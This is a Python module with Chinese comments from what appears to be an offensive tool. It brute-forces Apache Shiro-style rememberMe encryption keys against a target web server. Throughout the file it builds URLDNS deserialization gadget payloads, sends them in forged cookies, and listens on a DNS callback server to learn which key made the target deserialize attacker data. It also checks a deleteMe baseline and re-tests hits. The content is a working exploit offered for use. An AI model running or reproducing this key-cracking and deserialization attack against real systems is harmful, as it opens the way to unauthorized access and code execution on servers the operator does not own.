#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""RememberMe 密钥爆破（带 oracle 自检，避免假阳性）。

判定链路：
    1. 先做 deleteMe 基线：目标对“格式合法、密钥错误”的 Cookie 必须回写
       ``rememberMe=deleteMe``，否则说明无法用响应差异判断密钥，直接停止，
       免得把“目标压根没启用 rememberMe”误报成“命中密钥”；
    2. 对每个候选密钥生成 URLDNS payload，域名里带**每个 key 独立的 token**；
    3. 并发发包（每个 key 一个请求）；
    4. 内置 DNS 监听器收到哪个 token 的解析，就说明哪个 key 解密成功并触发了
       反序列化 —— 这是“真正打通了链路”的证据，而不是靠响应猜测；
    5. 对命中项可选复测（重新生成 token 再打一次）。
"""

from __future__ import annotations

import random
import secrets
import string
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field

from . import gadgets, rememberme
from .callback import CallbackServer
from .httpc import HttpClient, Response, normalize_base
from .keys import KeyEntry


@dataclass
class KeyProbe:
    key: str
    source: str
    token: str
    cookie_len: int = 0
    status: int = 0
    delete_me: bool = False
    error: str | None = None
    dns_hit: bool = False
    confirmed: bool = False


@dataclass
class BruteReport:
    url: str
    domain: str
    oracle_ok: bool = False
    oracle_note: str = ""
    probes: list[KeyProbe] = field(default_factory=list)
    started: float = field(default_factory=time.time)
    elapsed: float = 0.0

    @property
    def hits(self) -> list[KeyProbe]:
        return [p for p in self.probes if p.dns_hit or p.confirmed]

    @property
    def suspicious(self) -> list[KeyProbe]:
        """解密没有报错（无 deleteMe）但也没有收到回连的密钥。"""
        return [p for p in self.probes if not p.delete_me and not p.dns_hit
                and not p.error]

    def describe(self) -> str:
        lines = [f"目标: {self.url}", f"回调域名: {self.domain}"]
        lines.append(f"oracle: {'可用' if self.oracle_ok else '不可用'}"
                     + (f"（{self.oracle_note}）" if self.oracle_note else ""))
        lines.append(f"共测试 {len(self.probes)} 个密钥，耗时 {self.elapsed:.1f}s")
        if self.hits:
            lines.append(f"[+] 命中 {len(self.hits)} 个密钥:")
            for p in self.hits:
                flag = "已复测" if p.confirmed else "DNS 回调"
                lines.append(f"    {p.key}    ({flag}, 来源: {p.source})")
        else:
            lines.append("[-] 未命中任何密钥")
        if self.suspicious:
            lines.append(f"[?] {len(self.suspicious)} 个密钥无 deleteMe 但无回调，"
                         "可能是目标禁止出网或 DNS 未指向本机:")
            for p in self.suspicious[:10]:
                lines.append(f"    {p.key}")
        return "\n".join(lines)

    def to_dict(self) -> dict:
        return {
            "url": self.url,
            "domain": self.domain,
            "oracle_ok": self.oracle_ok,
            "oracle_note": self.oracle_note,
            "elapsed": round(self.elapsed, 2),
            "hits": [{"key": p.key, "source": p.source, "confirmed": p.confirmed,
                      "dns_hit": p.dns_hit} for p in self.hits],
            "suspicious": [p.key for p in self.suspicious],
            "probes": [p.__dict__ for p in self.probes],
        }


def _token(prefix: str = "s") -> str:
    return prefix + secrets.token_hex(4)


def _send_probe(client: HttpClient, url: str, key: str, token: str,
                domain: str, timeout: float) -> KeyProbe:
    probe = KeyProbe(key=key, source="", token=token)
    host = f"{token}.{domain}"
    try:
        payload = gadgets.url_dns_payload(host)
        cookie = rememberme.build_cookie(key, payload)
        probe.cookie_len = len(cookie)
        resp = client.get(url, headers={"Cookie": f"rememberMe={cookie}"})
        probe.status = resp.status
        probe.delete_me = rememberme.is_delete_me(resp)
        probe.error = resp.error
    except Exception as exc:  # noqa: BLE001
        probe.error = f"{type(exc).__name__}: {exc}"
    return probe


def _wait_tokens(server: CallbackServer, probes: list[KeyProbe],
                 timeout: float) -> None:
    deadline = time.time() + timeout
    pending = {p.token for p in probes}
    while pending and time.time() < deadline:
        seen = {hit.qname for hit in server.dns_hits}
        for probe in probes:
            if probe.token in pending:
                for qname in seen:
                    if probe.token in qname:
                        probe.dns_hit = True
                        pending.discard(probe.token)
                        break
        if pending:
            time.sleep(0.1)


def brute_keys(url: str, keys: list[KeyEntry], domain: str,
               client: HttpClient | None = None,
               server: CallbackServer | None = None,
               workers: int = 8, callback_timeout: float = 8.0,
               verify: bool = False, delay: float = 0.0,
               verbose: bool = True) -> BruteReport:
    base = normalize_base(url)
    client = client or HttpClient(timeout=10)
    domain = domain.strip().strip(".")
    report = BruteReport(url=base, domain=domain)

    baseline = rememberme.baseline_probe(client, base + "/")
    report.oracle_ok = baseline.delete_me
    report.oracle_note = baseline.describe()
    if verbose:
        print(f"[*] {baseline.describe()}")
    if not baseline.delete_me:
        if verbose:
            print("[!] 无法建立 deleteMe 基线，停止爆破（避免假阳性）。")
            print("    排查：目标是否启用 rememberMe / 是否被 WAF 改写 / 是否走 HTTPS 出错")
        return report

    own_server = server is None
    if own_server:
        server = CallbackServer(dns_port=53, enable_http=False, verbose=verbose)
        server.start()
        if not server.dns_ready:
            report.oracle_note = "; ".join(server.errors) or "DNS 端口绑定失败"
            if verbose:
                print(f"[!] {report.oracle_note}")
                print("    可用 --dns-port 指定其他端口，并把目标域名解析到该端口")
            return report

    try:
        probes: list[KeyProbe] = []
        # 每个 key 一个独立 token
        token_map = {}
        for entry in keys:
            probe = KeyProbe(key=entry.key, source=entry.source, token=_token())
            token_map[probe.token] = probe
            probes.append(probe)

        if verbose:
            print(f"[*] 开始爆破：{len(probes)} 个密钥，{workers} 并发，"
                  f"回调等待 {callback_timeout}s")
        with ThreadPoolExecutor(max_workers=max(1, workers)) as pool:
            futures = {}
            for probe in probes:
                futures[pool.submit(_send_probe, client, base + "/", probe.key,
                                    probe.token, domain, client.timeout)] = probe
                if delay:
                    time.sleep(delay)
            for future in as_completed(futures):
                probe = futures[future]
                try:
                    result = future.result()
                except Exception as exc:  # noqa: BLE001
                    probe.error = str(exc)
                    continue
                probe.cookie_len = result.cookie_len
                probe.status = result.status
                probe.delete_me = result.delete_me
                probe.error = result.error

        _wait_tokens(server, probes, callback_timeout)
        hits = [p for p in probes if p.dns_hit]

        if verify and hits:
            if verbose:
                print(f"[*] 复测 {len(hits)} 个命中密钥...")
            server.reset()
            retest: list[KeyProbe] = []
            for probe in hits:
                re_probe = KeyProbe(key=probe.key, source=probe.source,
                                    token=_token("v"))
                result = _send_probe(client, base + "/", re_probe.key,
                                     re_probe.token, domain, client.timeout)
                re_probe.cookie_len = result.cookie_len
                re_probe.status = result.status
                re_probe.delete_me = result.delete_me
                re_probe.error = result.error
                retest.append(re_probe)
            _wait_tokens(server, retest, callback_timeout)
            for original, again in zip(hits, retest):
                original.confirmed = again.dns_hit

        report.probes = probes
        report.elapsed = time.time() - report.started
        if verbose:
            print(report.describe())
        return report
    finally:
        if own_server and server is not None:
            server.stop()
